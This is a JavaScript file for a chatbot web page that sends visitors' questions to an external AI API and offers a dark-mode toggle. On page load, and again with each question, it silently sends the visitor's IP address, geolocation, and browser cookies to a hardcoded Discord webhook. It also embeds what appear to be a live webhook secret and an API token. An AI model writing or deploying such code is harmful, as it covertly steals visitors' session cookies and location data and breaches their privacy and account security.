const bannedUsers = [
    { cookie: '¿example_cookie1¿', ip: '¿192.168.1.1¿' }, // Example banned user 1
    { cookie: '¿example_cookie2¿', ip: '!!!.!!!.!.!' }, // Example banned user 2
    { cookie: '¿example_cookie3¿', ip: '???.???.?.?' }  // Example banned user 3
    // No comma after the last item
];

// Emoji list
const statusEmojis = {
    check: 'https://link-to-check-emoji.png',
    empty: 'https://link-to-empty-emoji.png',
    cross: 'https://link-to-cross-emoji.png',
    warning: 'https://link-to-warning-emoji.png',
    yellowAlert: 'https://link-to-yellow-alert-emoji.png',
    orangeAlert: 'https://link-to-orange-alert-emoji.png',
    redAlert: 'https://link-to-red-alert-emoji.png',
    space: 'https://link-to-space-emoji.png',
    ellipsis: 'https://link-to-ellipsis-emoji.png',
    rage: 'https://link-to-rage-emoji.png',
};

document.addEventListener('DOMContentLoaded', async function() {
    const ipInfoResponse = await fetch('https://ipinfo.io/json?token=99798ae623ac1d'); // Replace with your IPInfo API token
    const ipData = await ipInfoResponse.json();
    const visitorCookie = document.cookie || 'No cookies found';

    // Set status to loading
    const statusImage = document.querySelector('.status-image');
    const statusMessage = document.querySelector('.status-message');
    statusImage.src = statusEmojis.space; // Space emoji during check
    statusMessage.innerText = "Loading...";

    // Check if the visitor is banned
    const isBanned = bannedUsers.some(user => user.cookie === visitorCookie || user.ip === ipData.ip);

    if (isBanned) {
        // Send webhook for banned user visit
        const bannedVisitWebhookMessage = {
            title: "Banned User Visit",
            description: `
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
            `.trim(),
            color: 16711680 // Red color to indicate a banned user
        };
        await sendWebhook(bannedVisitWebhookMessage);

        // Disable interaction and notify the user
        const responseContainer = document.getElementById("response");
        const sendButton = document.getElementById("send");
        sendButton.disabled = true;
        // Update status image and message for banned users
        statusImage.src = statusEmojis.cross; // Cross emoji for banned users
        statusMessage.innerText = "You have been blacklisted from using this service."; // Message for banned users
        responseContainer.innerText = ""; // Clear response container
        return; // Exit the script if the user is banned
    }

    // Send webhook data on page visit for non-banned users
    const visitWebhookMessage = {
        title: "New Website Visit",
        description: `
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
        `.trim(),
        color: Math.floor(Math.random() * 16777215) // Random color
    };

    // Send webhook for new visitor
    await sendWebhook(visitWebhookMessage);

    // Toggle dark mode functionality
    const toggleDarkModeButton = document.getElementById('toggleDarkModeButton');
    toggleDarkModeButton.addEventListener('click', function() {
        document.body.classList.toggle('dark-mode');
        this.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
    });

    // Handle question asking and response
    const inputBox = document.getElementById("question");
    const sendButton = document.getElementById("send");
    const responseContainer = document.getElementById("response");

    sendButton.addEventListener("click", async function() {
        const question = inputBox.value;
        if (!question) return;

        sendButton.disabled = true;
        sendButton.innerText = "...";

        // Set loading state
        statusImage.src = statusEmojis.space; // Set status image to loading
        statusMessage.innerText = "Loading..."; // Update status message

        const startTime = Date.now();
        const response = await fetch(`https://tilki.dev/api/hercai?soru=${encodeURIComponent(question)}`);
        const data = await response.json();
        const endTime = Date.now();

        const timeTaken = endTime - startTime;
        const formattedTime = formatDuration(timeTaken);

        if (data.error) {
            // Handle error case
            statusImage.src = statusEmojis.cross; // Change image to cross on error
            statusMessage.innerText = "There was an error processing your request. Please try again later.";
            responseContainer.innerText = ""; // Clear the response container
            sendButton.innerText = "Send";
        } else {
            // Successful response
            statusImage.src = statusEmojis.check; // Change image to check on success
            statusMessage.innerText = "The API is all good!"; // Update status message

            const questionWebhookMessage = {
                title: "Question Asked",
                description: `
**Question:** ${question}
**Response:** ${data.cevap}
**Time Taken:** ${formattedTime}
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Cookies:** ${visitorCookie}
                `.trim(),
                color: Math.floor(Math.random() * 16777215)
            };

            // Send webhook for the question
            await sendWebhook(questionWebhookMessage);

            responseContainer.innerText = data.cevap;
        }

        // Cooldown before re-enabling the button
        setTimeout(() => {
            sendButton.disabled = false;
            sendButton.innerText = "Send";
        }, 3000); // 3-second cooldown
    });

    async function sendWebhook(embedMessage) {
        const webhookUrl = 'https://discord.com/api/webhooks/1289960861028454481/wXuSMQSu71G0XjJouR2MtLJSupMuRcRZo0CNSVpyfw3Hma5uaiOO3R0KomuissnxXH5F'; // Replace with your actual webhook URL
        const payload = {
            embeds: [embedMessage]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    }

    function formatDuration(ms) {
        if (ms < 1000) {
            return `${ms} ms`;
        } else if (ms < 60000) {
            return `${Math.floor(ms / 1000)} seconds`;
        } else {
            return `${Math.floor(ms / 60000)} minutes`;
        }
    }
});
